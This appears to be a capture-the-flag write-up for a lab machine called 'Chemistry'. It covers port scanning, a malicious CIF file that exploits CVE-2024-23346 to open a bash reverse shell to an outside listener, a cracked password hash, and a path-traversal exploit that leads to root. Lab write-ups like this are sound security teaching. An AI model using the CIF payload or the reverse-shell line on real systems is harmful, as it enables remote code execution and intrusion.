# Chemistry

## Enumeration

```bash
nmap -v -A -O -p- -T4 -Pn -sC chemistry.htb -oN nmap
```

```bash
Nmap scan report for chemistry.htb (10.10.11.38)
Host is up (0.048s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b6:fc:20:ae:9d:1d:45:1d:0b:ce:d9:d0:20:f2:6f:dc (RSA)
|   256 f1:ae:1c:3e:1d:ea:55:44:6c:2f:f2:56:8d:62:3c:2b (ECDSA)
|_  256 94:42:1b:78:f2:51:87:07:3e:97:26:c9:a2:5c:0a:26 (ED25519)
5000/tcp open  http    Werkzeug httpd 3.0.3 (Python 3.9.5)
| http-methods: 
|_  Supported Methods: OPTIONS GET HEAD
|_http-title: Chemistry - Home
|_http-server-header: Werkzeug/3.0.3 Python/3.9.5
Device type: general purpose
Running: Linux 5.X
OS CPE: cpe:/o:linux:linux_kernel:5
OS details: Linux 5.0 - 5.14
Uptime guess: 8.610 days (since Tue Dec 31 18:57:15 2024)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=261 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 8888/tcp)
HOP RTT      ADDRESS
1   47.28 ms 10.10.14.1
2   47.83 ms chemistry.htb (10.10.11.38)
```

If we try to enumerate some directories or files we will obtain this:

<figure><img src="../../.gitbook/assets/image (896).png" alt=""><figcaption></figcaption></figure>

## Foothold (app)

Searching on Google for some resources related to CIF files and exploit available, we will find that <mark style="color:yellow;">**CVE-2024-23346**</mark>

[https://www.vicarius.io/vsociety/posts/critical-security-flaw-in-pymatgen-library-cve-2024-23346](https://www.vicarius.io/vsociety/posts/critical-security-flaw-in-pymatgen-library-cve-2024-23346)

Using this malicious file CIF we can obtain a reverse shell:

```
data_Example
_cell_length_a    10.00000
_cell_length_b    10.00000
_cell_length_c    10.00000
_cell_angle_alpha 90.00000
_cell_angle_beta  90.00000
_cell_angle_gamma 90.00000
_symmetry_space_group_name_H-M 'P 1'
loop_
 _atom_site_label
 _atom_site_fract_x
 _atom_site_fract_y
 _atom_site_fract_z
 _atom_site_occupancy
 
 H 0.00000 0.00000 0.00000 1
 O 0.50000 0.50000 0.50000 1
_space_group_magn.transform_BNS_Pp_abc  'a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+["__sub" + "classes__"]) () if d.__name__ == "BuiltinImporter"][0].load_module ("os").system ("/bin/bash -c \'sh -i >& /dev/tcp/10.10.14.86/4444 0>&1\'");0,0,0'

_space_group_magn.number_BNS  62.448
_space_group_magn.name_BNS  "P  n'  m  a'  "
```

Running a netcat listener and viewing the malicious file uploaded we will obtain a reverse shell:

<figure><img src="../../.gitbook/assets/image (897).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (898).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

We can't read the rosa file user.txt containing the flag, so we need to escalate our user:

<figure><img src="../../.gitbook/assets/image (899).png" alt=""><figcaption></figcaption></figure>

Analyze the SQLite database using sqlite3:

<figure><img src="../../.gitbook/assets/image (900).png" alt=""><figcaption></figcaption></figure>

We will obtain the hash MD5 password of user "rosa", try to crack it:

`63ed86ee9f624c7b14f1d4f43dc251a5 -> unicorniosrosados`

<figure><img src="../../.gitbook/assets/image (901).png" alt=""><figcaption></figcaption></figure>

Easy man :police\_officer:, use SSH to login as rosa and get the user flag:&#x20;

<figure><img src="../../.gitbook/assets/image (902).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation (root)

Using LinPeas we can find that machine is vulnerable to CVE-2021-3560 but seems to be a false positive. Deep dive...

<figure><img src="../../.gitbook/assets/image (903).png" alt=""><figcaption></figcaption></figure>

We can look at active ports on machine other than 22 and 5000. There is 8080 running port:

<figure><img src="../../.gitbook/assets/image (904).png" alt=""><figcaption></figcaption></figure>

curling the 8080 port we will obtain this result:

<figure><img src="../../.gitbook/assets/image (905).png" alt=""><figcaption></figcaption></figure>

To explore website as a local website, we can use SSH Local Port Forwarding (L-Tunnel):

```bash
ssh -L 8080:localhost:8080 rosa@chemistry.htb
```

The web server seems to be strange:

<figure><img src="../../.gitbook/assets/image (906).png" alt=""><figcaption></figcaption></figure>

Using whatweb we can find the correct webserver provided by HTTP Headers:

<figure><img src="../../.gitbook/assets/image (907).png" alt=""><figcaption></figcaption></figure>

Searching on Google we can find a Path Traversal vulnerability:

{% embed url="https://github.com/z3rObyte/CVE-2024-23334-PoC" %}

To succesfully run the exploit we need to find a payload directory on which run path traversal exploit:

<figure><img src="../../.gitbook/assets/image (908).png" alt=""><figcaption></figcaption></figure>

Easy ffuf as always:

<figure><img src="../../.gitbook/assets/image (909).png" alt=""><figcaption></figcaption></figure>

Modify the script:

<figure><img src="../../.gitbook/assets/image (910).png" alt=""><figcaption></figcaption></figure>

Finally read the root flag :tada:

